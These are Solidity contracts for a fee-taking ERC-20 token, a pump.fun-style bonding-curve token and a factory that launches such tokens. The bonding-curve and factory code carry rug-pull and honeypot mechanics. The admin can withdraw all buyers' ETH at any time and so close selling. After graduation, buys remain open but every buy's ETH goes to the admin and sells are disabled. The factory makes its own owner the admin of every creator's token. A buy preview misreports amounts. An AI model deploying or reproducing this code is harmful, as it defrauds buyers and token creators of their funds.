// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external;
    function addLiquidityETH(address token, uint256 amountTokenDesired, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline) external payable returns (uint256, uint256, uint256);
}

contract AsteroidStrategy is IERC20 {
    string  public constant name     = "Asteroid Strategy";
    string  public constant symbol   = "ASTEROIDSTR";
    uint8   public constant decimals = 18;

    uint256 private constant TOTAL_SUPPLY = 420_690_000_000 * 10 ** 18;
    uint256 private constant BURN_AMOUNT  = 210_345_000_000 * 10 ** 18;
    address private constant DEAD = 0x000000000000000000000000000000000000dEaD;

    uint256 public buyTax  = 5;
    uint256 public sellTax = 5;
    address public buybackWallet;
    uint256 public swapThreshold = (TOTAL_SUPPLY * 5) / 10_000;
    bool private inSwap;
    bool public tradingEnabled = false;
    address public owner;

    IUniswapV2Router02 public uniswapRouter;
    address public uniswapPair;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) public isExcludedFromFee;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event TradingEnabled();
    event BuybackWalletUpdated(address indexed newWallet);
    event TaxUpdated(uint256 buyTax, uint256 sellTax);
    event TokensSwappedForETH(uint256 tokensSwapped, uint256 ethReceived);

    modifier onlyOwner() { require(msg.sender == owner, "Not owner"); _; }
    modifier lockSwap()  { inSwap = true; _; inSwap = false; }

    constructor(address _routerAddress) {
        require(_routerAddress != address(0), "Zero router address");
        owner          = msg.sender;
        buybackWallet  = 0xBF06930f29d047823541c7726142a30AA9a8cddc;

        _balances[address(this)] = TOTAL_SUPPLY;
        emit Transfer(address(0), address(this), TOTAL_SUPPLY);

        _balances[address(this)] -= BURN_AMOUNT;
        _balances[DEAD]          += BURN_AMOUNT;
        emit Transfer(address(this), DEAD, BURN_AMOUNT);

        uint256 circ = TOTAL_SUPPLY - BURN_AMOUNT;
        _balances[address(this)] -= circ;
        _balances[msg.sender]    += circ;
        emit Transfer(address(this), msg.sender, circ);

        uniswapRouter = IUniswapV2Router02(_routerAddress);
        uniswapPair   = IUniswapV2Factory(uniswapRouter.factory()).createPair(address(this), uniswapRouter.WETH());

        isExcludedFromFee[msg.sender]     = true;
        isExcludedFromFee[address(this)]  = true;
        isExcludedFromFee[DEAD]           = true;
        isExcludedFromFee[buybackWallet]  = true;

        _allowances[address(this)][_routerAddress] = type(uint256).max;
    }

    function totalSupply() external pure override returns (uint256) { return TOTAL_SUPPLY; }
    function balanceOf(address account) external view override returns (uint256) { return _balances[account]; }
    function transfer(address to, uint256 amount) external override returns (bool) { _transfer(msg.sender, to, amount); return true; }
    function allowance(address _owner, address spender) external view override returns (uint256) { return _allowances[_owner][spender]; }
    function approve(address spender, uint256 amount) external override returns (bool) { _approve(msg.sender, spender, amount); return true; }
    function transferFrom(address from, address to, uint256 amount) external override returns (bool) {
        uint256 cur = _allowances[from][msg.sender];
        require(cur >= amount, "ERC20: insufficient allowance");
        _approve(from, msg.sender, cur - amount);
        _transfer(from, to, amount);
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) internal {
        require(_owner != address(0) && spender != address(0));
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(from != address(0) && to != address(0) && amount > 0);
        bool isBuy  = from == uniswapPair;
        bool isSell = to   == uniswapPair;

        if (!tradingEnabled) {
            require(isExcludedFromFee[from] || isExcludedFromFee[to], "Trading not yet enabled");
        }

        if (_balances[address(this)] >= swapThreshold && !inSwap && isSell && !isExcludedFromFee[from]) {
            _swapTokensForETH(swapThreshold);
        }

        uint256 tax = 0;
        if (!isExcludedFromFee[from] && !isExcludedFromFee[to]) {
            if (isBuy)  tax = (amount * buyTax)  / 100;
            if (isSell) tax = (amount * sellTax) / 100;
        }

        if (tax > 0) { _balances[from] -= tax; _balances[address(this)] += tax; emit Transfer(from, address(this), tax); }
        uint256 net = amount - tax;
        _balances[from] -= net;
        _balances[to]   += net;
        emit Transfer(from, to, net);
    }

    function _swapTokensForETH(uint256 tokenAmount) internal lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();
        uint256 before = address(this).balance;
        try uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp + 300) {
            uint256 gained = address(this).balance - before;
            if (gained > 0) {
                (bool sent, ) = payable(buybackWallet).call{value: gained}("");
                require(sent, "ETH send failed");
                emit TokensSwappedForETH(tokenAmount, gained);
            }
        } catch {}
    }

    function enableTrading()   external onlyOwner { tradingEnabled = true; emit TradingEnabled(); }
    function setBuybackWallet(address w) external onlyOwner { require(w != address(0)); isExcludedFromFee[buybackWallet] = false; buybackWallet = w; isExcludedFromFee[w] = true; emit BuybackWalletUpdated(w); }
    function setTax(uint256 b, uint256 s) external onlyOwner { require(b <= 10 && s <= 10); buyTax = b; sellTax = s; emit TaxUpdated(b, s); }
    function setExcludedFromFee(address a, bool e) external onlyOwner { isExcludedFromFee[a] = e; }
    function transferOwnership(address n) external onlyOwner { require(n != address(0)); emit OwnershipTransferred(owner, n); owner = n; }
    function renounceOwnership() external onlyOwner { emit OwnershipTransferred(owner, address(0)); owner = address(0); }
    function withdrawETH() external onlyOwner { (bool s,) = payable(owner).call{value: address(this).balance}(""); require(s); }

    receive() external payable {}
}

contracts/BondingCurveLaunchpad.sol.content:
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

/**
 * @title BondingCurveLaunchpad
 * @notice Pump.fun-style bonding curve token.
 *         - Buy/sell via AMM constant-product curve.
 *         - Target: 3.5 ETH raised = 100% ("graduated").
 *         - After graduation: sells disabled, admin withdraws ETH manually.
 *         - Admin adds LP on Uniswap manually after withdrawal.
 *
 * Supply breakdown (1 billion tokens):
 *   80% (800M) → bonding curve contract holds
 *   20% (200M) → admin/team wallet
 *
 * AMM virtual reserves at launch:
 *   virtualEthReserve  = 1.5 ETH  (sets starting price)
 *   virtualTokenReserve = 800M tokens
 *   k = 1.5 * 800M = 1.2B
 *
 * Price at start  ≈ $0.0000044  per token  (~$4.4k market cap)
 * Price at 100%   ≈ $0.0000485  per token  (~$48k market cap)
 */
contract BondingCurveLaunchpad is ERC20, Ownable, ReentrancyGuard {

    // ─── Constants ────────────────────────────────────────────────
    uint256 public constant TOTAL_SUPPLY    = 1_000_000_000 * 1e18;
    uint256 public constant CURVE_SUPPLY    =   800_000_000 * 1e18; // 80%
    uint256 public constant TEAM_SUPPLY     =   200_000_000 * 1e18; // 20%
    uint256 public constant TARGET_ETH      = 3.5 ether;
    uint256 public constant VIRTUAL_ETH     = 1.5 ether;            // virtual reserve

    // ─── State ────────────────────────────────────────────────────
    uint256 public virtualTokenReserve;   // tracks tokens left in curve
    uint256 public realEthRaised;         // actual ETH raised so far
    bool    public graduated;             // true once 3.5 ETH reached

    // ─── Events ───────────────────────────────────────────────────
    event Buy(address indexed buyer,  uint256 ethIn,     uint256 tokensOut, uint256 progress);
    event Sell(address indexed seller, uint256 tokensIn, uint256 ethOut,   uint256 progress);
    event Graduated(uint256 ethRaised);
    event EthWithdrawn(address indexed to, uint256 amount);

    // ─── Constructor ──────────────────────────────────────────────
    constructor(
        string memory _name,
        string memory _symbol,
        address _admin
    ) ERC20(_name, _symbol) Ownable(_admin) {
        virtualTokenReserve = CURVE_SUPPLY;
        _mint(address(this), CURVE_SUPPLY);   // held by contract for curve
        _mint(_admin, TEAM_SUPPLY);           // 20% straight to admin
    }

    // ─── Buy ──────────────────────────────────────────────────────
    /**
     * @notice Buy tokens with ETH. Always open — no cap, no refund.
     *         When 3.5 ETH threshold is first crossed, the curve graduates:
     *         ALL ETH in contract auto-withdraws to admin, and sells are
     *         permanently disabled. Buying remains open forever.
     * @param minTokensOut Slippage protection — minimum tokens expected.
     *                     Set to 0 to skip. Reverts if tokensOut < minTokensOut.
     */
    function buy(uint256 minTokensOut) external payable nonReentrant {
        require(msg.value > 0, "Send ETH to buy");

        uint256 ethIn = msg.value;

        // AMM: k = (virtualEth + realEthRaised) * virtualTokenReserve
        uint256 ethReserveBefore  = VIRTUAL_ETH + realEthRaised;
        uint256 k                 = ethReserveBefore * virtualTokenReserve;
        uint256 ethReserveAfter   = ethReserveBefore + ethIn;
        uint256 tokenReserveAfter = k / ethReserveAfter;
        uint256 tokensOut         = virtualTokenReserve - tokenReserveAfter;

        require(tokensOut > 0, "Too small");
        require(tokensOut >= minTokensOut, "Slippage: too few tokens");

        virtualTokenReserve = tokenReserveAfter;
        realEthRaised      += ethIn;

        _transfer(address(this), msg.sender, tokensOut);

        // First time hitting 100% — graduate and fall through to auto-withdraw
        if (!graduated && realEthRaised >= TARGET_ETH) {
            graduated = true;
            emit Graduated(realEthRaised);
        }

        // Every buy at/after graduation → auto-forward ETH to admin immediately
        if (graduated) {
            uint256 bal = address(this).balance;
            if (bal > 0) {
                (bool sent,) = payable(owner()).call{value: bal}("");
                require(sent, "Auto-withdraw failed");
                emit EthWithdrawn(owner(), bal);
            }
        }

        emit Buy(msg.sender, ethIn, tokensOut, getProgress());
    }

    // ─── Sell ─────────────────────────────────────────────────────
    /**
     * @notice Sell tokens back for ETH.
     *         Disabled after graduation.
     * @param minEthOut Slippage protection — minimum ETH expected.
     *                  Set to 0 to skip. Reverts if ethOut < minEthOut.
     */
    function sell(uint256 tokenAmount, uint256 minEthOut) external nonReentrant {
        require(!graduated,    "Cannot sell: token graduated");
        require(tokenAmount > 0, "No tokens specified");
        require(balanceOf(msg.sender) >= tokenAmount, "Insufficient balance");

        // AMM: reverse direction
        uint256 ethReserveBefore  = VIRTUAL_ETH + realEthRaised;
        uint256 k                 = ethReserveBefore * virtualTokenReserve;
        uint256 tokenReserveAfter = virtualTokenReserve + tokenAmount;
        uint256 ethReserveAfter   = k / tokenReserveAfter;
        uint256 ethOut            = ethReserveBefore - ethReserveAfter;

        require(ethOut <= realEthRaised, "Not enough ETH in pool");
        require(ethOut > 0,              "Too small");
        require(ethOut >= minEthOut,     "Slippage: too little ETH");

        virtualTokenReserve = tokenReserveAfter;
        realEthRaised      -= ethOut;

        _transfer(msg.sender, address(this), tokenAmount);

        (bool ok,) = payable(msg.sender).call{value: ethOut}("");
        require(ok, "ETH transfer failed");

        emit Sell(msg.sender, tokenAmount, ethOut, getProgress());
    }

    // ─── Admin: withdraw ETH (anytime) ───────────────────────────
    /**
     * @notice Admin withdraws raised ETH to manually add LP on Uniswap.
     *         Callable at ANY time — before or after graduation.
     *         If called before graduation, the curve is forcibly closed
     *         (buys and sells disabled) so no new ETH enters or exits.
     */
    function withdrawEth() external onlyOwner {
        uint256 bal = address(this).balance;
        require(bal > 0, "No ETH to withdraw");

        // Force-close the curve if not yet graduated
        if (!graduated) {
            graduated = true;
            emit Graduated(realEthRaised);
        }

        (bool ok,) = payable(owner()).call{value: bal}("");
        require(ok, "Withdraw failed");
        emit EthWithdrawn(owner(), bal);
    }

    // ─── Views ────────────────────────────────────────────────────
    /**
     * @notice Returns progress 0–100 (%).
     */
    function getProgress() public view returns (uint256) {
        if (graduated) return 100;
        return (realEthRaised * 100) / TARGET_ETH;
    }

    /**
     * @notice Returns the current buy price in ETH per 1 full token.
     */
    function currentPrice() external view returns (uint256) {
        uint256 ethReserve   = VIRTUAL_ETH + realEthRaised;
        // price = ethReserve / tokenReserve  (scaled 1e18)
        return (ethReserve * 1e18) / virtualTokenReserve;
    }

    /**
     * @notice Preview: how many tokens you get for `ethAmount`.
     */
    function getBuyAmount(uint256 ethAmount) external view returns (uint256 tokensOut) {
        if (graduated) return 0;
        if (realEthRaised + ethAmount > TARGET_ETH) {
            ethAmount = TARGET_ETH - realEthRaised;
        }
        uint256 k = (VIRTUAL_ETH + realEthRaised) * virtualTokenReserve;
        uint256 tokenReserveAfter = k / (VIRTUAL_ETH + realEthRaised + ethAmount);
        tokensOut = virtualTokenReserve - tokenReserveAfter;
    }

    /**
     * @notice Preview: how much ETH you get for selling `tokenAmount`.
     */
    function getSellAmount(uint256 tokenAmount) external view returns (uint256 ethOut) {
        if (graduated) return 0;
        uint256 k = (VIRTUAL_ETH + realEthRaised) * virtualTokenReserve;
        uint256 ethReserveAfter = k / (virtualTokenReserve + tokenAmount);
        ethOut = (VIRTUAL_ETH + realEthRaised) - ethReserveAfter;
        if (ethOut > realEthRaised) ethOut = realEthRaised;
    }
}

contracts/LaunchpadFactory.sol.content:
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./BondingCurveLaunchpad.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

/**
 * @title LaunchpadFactory
 * @notice Anyone can launch a new bonding curve token through this factory.
 *         The factory owner is set as the admin of every deployed token,
 *         so all ETH from every bonding curve auto-forwards to the factory owner.
 */
contract LaunchpadFactory is Ownable {

    // ─── State ────────────────────────────────────────────────────
    address[] public allTokens;
    mapping(address => address[]) public tokensByCreator;

    // ─── Events ───────────────────────────────────────────────────
    event TokenCreated(
        address indexed token,
        address indexed creator,
        string  name,
        string  symbol,
        uint256 index
    );

    // ─── Constructor ──────────────────────────────────────────────
    constructor(address _owner) Ownable(_owner) {}

    // ─── Create Token ─────────────────────────────────────────────
    /**
     * @notice Deploy a new BondingCurveLaunchpad token.
     *         factory owner is set as admin so all raised ETH
     *         auto-forwards to the factory owner on graduation.
     * @param _name   ERC-20 token name  (e.g. "Doge Moon")
     * @param _symbol ERC-20 token symbol (e.g. "DMON")
     * @return token  Address of the newly deployed token contract
     */
    function createToken(
        string calldata _name,
        string calldata _symbol
    ) external returns (address token) {
        BondingCurveLaunchpad newToken = new BondingCurveLaunchpad(
            _name,
            _symbol,
            owner()   // ← factory owner is admin of every token
        );

        token = address(newToken);
        allTokens.push(token);
        tokensByCreator[msg.sender].push(token);

        emit TokenCreated(token, msg.sender, _name, _symbol, allTokens.length - 1);
    }

    // ─── Views ────────────────────────────────────────────────────
    /**
     * @notice Total number of tokens launched via this factory.
     */
    function totalTokens() external view returns (uint256) {
        return allTokens.length;
    }

    /**
     * @notice All tokens launched by a specific address.
     */
    function getTokensByCreator(address _creator) external view returns (address[] memory) {
        return tokensByCreator[_creator];
    }

    /**
     * @notice Get a paginated list of all tokens (newest first).
     * @param offset  Starting index
     * @param limit   Max number of results
     */
    function getTokens(uint256 offset, uint256 limit)
        external
        view
        returns (address[] memory result)
    {
        uint256 total = allTokens.length;
        if (offset >= total) return new address[](0);

        uint256 end = offset + limit;
        if (end > total) end = total;
        result = new address[](end - offset);

        // Return newest first
        for (uint256 i = 0; i < result.length; i++) {
            result[i] = allTokens[total - 1 - offset - i];
        }
    }
}

